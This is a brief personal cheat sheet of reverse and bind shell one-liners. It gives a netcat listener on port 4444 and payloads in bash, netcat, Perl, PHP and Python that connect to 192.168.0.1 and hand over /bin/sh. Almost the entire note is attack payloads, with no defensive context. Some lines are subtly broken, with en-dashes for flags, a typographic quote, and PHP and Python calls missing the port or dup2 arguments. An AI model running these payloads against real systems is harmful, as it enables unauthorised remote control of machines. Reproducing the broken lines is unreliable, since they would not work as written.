---
created: 2024-06-15T20:07
updated: 2024-06-24T21:00
---

## Listen for target

```sh
nc –lvp 4444
```

## Payloads

```sh
bash -c 'sh -i >& /dev/tcp/192.168.0.1/4444 0>&1'
bash -i >& /dev/tcp/192.168.0.1/4444 0>&1
nc 192.168.0.1 4444 –e /bin/bash
nc -lvp 4444 -e /bin/sh

perl -e 'use Socket;$i="192.168.0.1″;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

php -r '$sock=fsockopen("192.168.0.1");exec("/bin/sh -i <&3 >&3 2>&3");'

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.1"));os.dup2(s.fileno()); os.dup2(s.fileno()); os.dup2(s.fileno());p=subprocess.call(["/bin/sh","-i"]);'
```

> with reference to [Hacking with Netcat part 2: Bind and reverse shells - Hacking Tutorials](https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/)
